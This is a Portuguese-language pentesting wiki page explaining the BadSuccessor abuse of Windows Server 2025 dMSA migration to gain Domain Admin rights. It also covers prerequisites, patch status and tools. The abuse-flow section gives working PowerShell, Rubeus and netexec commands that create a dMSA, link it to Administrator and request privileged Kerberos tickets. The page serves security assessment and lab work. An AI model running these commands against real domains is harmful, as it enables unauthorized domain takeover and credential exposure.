# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

**BadSuccessor** abusa do fluxo de migração do **delegated Managed Service Account** (**dMSA**) introduzido no **Windows Server 2025**. Um dMSA pode ser vinculado a uma conta legada por meio de **`msDS-ManagedAccountPrecededByLink`** e movido pelos estados de migração armazenados em **`msDS-DelegatedMSAState`**. Se um atacante conseguir criar um dMSA em uma OU gravável e controlar esses atributos, o KDC pode emitir tickets para o dMSA controlado pelo atacante com o **contexto de autorização da conta vinculada**.

Na prática, isso significa que um usuário com poucos privilégios e que só tenha direitos delegados de OU pode criar um novo dMSA, apontá-lo para `Administrator`, concluir o estado de migração e então obter um TGT cujo PAC contém grupos privilegiados como **Domain Admins**.

## Detalhes de migração do dMSA que importam

- dMSA é um recurso do **Windows Server 2025**.
- `Start-ADServiceAccountMigration` define a migração para o estado **started**.
- `Complete-ADServiceAccountMigration` define a migração para o estado **completed**.
- `msDS-DelegatedMSAState = 1` significa migração iniciada.
- `msDS-DelegatedMSAState = 2` significa migração concluída.
- Durante a migração legítima, o dMSA deve substituir a conta superada de forma transparente, então o KDC/LSA preservam o acesso que a conta anterior já tinha.

O Microsoft Learn também observa que, durante a migração, a conta original fica vinculada ao dMSA e o dMSA deve acessar o que a conta antiga podia acessar. Essa é a suposição de segurança que o BadSuccessor abusa.

## Requisitos

1. Um domínio onde **dMSA exists**, o que significa que há suporte do **Windows Server 2025** do lado do AD.
2. O atacante pode **create** objetos `msDS-DelegatedManagedServiceAccount` em alguma OU, ou tem direitos equivalentes e amplos de criação de objetos filho ali.
3. O atacante pode **write** os atributos relevantes do dMSA ou controlar totalmente o dMSA que acabou de criar.
4. O atacante pode solicitar tickets Kerberos a partir de um contexto ingressado no domínio ou de um túnel que alcance LDAP/Kerberos.

### Verificações práticas

O sinal operacional mais limpo é verificar o nível do domínio/forest e confirmar que o ambiente já está usando a nova stack do Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Se você vir valores como `Windows2025Domain` e `Windows2025Forest`, trate **BadSuccessor / dMSA migration abuse** como uma verificação prioritária.

Você também pode enumerar OUs graváveis delegadas para criação de dMSA com ferramentas públicas:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Fluxo de abuso

1. Crie um dMSA em uma OU onde você tenha direitos delegados de create-child.
2. Defina **`msDS-ManagedAccountPrecededByLink`** para o DN de um alvo privilegiado, como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Defina **`msDS-DelegatedMSAState`** como `2` para marcar a migração como concluída.
4. Solicite um TGT para o novo dMSA e use o ticket retornado para acessar serviços privilegiados.

Exemplo em PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Exemplos de solicitação de ticket / tooling operacional:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Por que isso é mais do que privilege escalation

Durante uma migração legítima, o Windows também precisa que a nova dMSA lide com tickets que foram emitidos para a conta anterior antes da troca. É por isso que o material de ticket relacionado a dMSA pode incluir chaves **atuais** e **anteriores** no fluxo **`KERB-DMSA-KEY-PACKAGE`**.

Para uma migração falsa controlada por um atacante, esse comportamento pode transformar BadSuccessor em:

- **Privilege escalation** ao herdar SIDs de grupos privilegiados no PAC.
- **Credential material exposure** porque o tratamento da chave anterior pode expor material equivalente ao RC4/NT hash do predecessor em workflows vulneráveis.

Isso torna a técnica útil tanto para takeover direto do domínio quanto para operações subsequentes, como pass-the-hash ou comprometimento mais amplo de credenciais.

## Notes on patch status

O comportamento original do BadSuccessor **não é apenas um issue teórico de preview de 2025**. A Microsoft atribuiu **CVE-2025-53779** e publicou uma atualização de segurança em **agosto de 2025**. Mantenha este ataque documentado para:

- **labs / CTFs / exercícios de assume-breach**
- **ambientes Windows Server 2025 sem patch**
- **validação de delegações de OU e exposição de dMSA durante assessments**

Não presuma que um domínio Windows Server 2025 seja vulnerável só porque dMSA existe; verifique o nível de patch e teste com cuidado.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
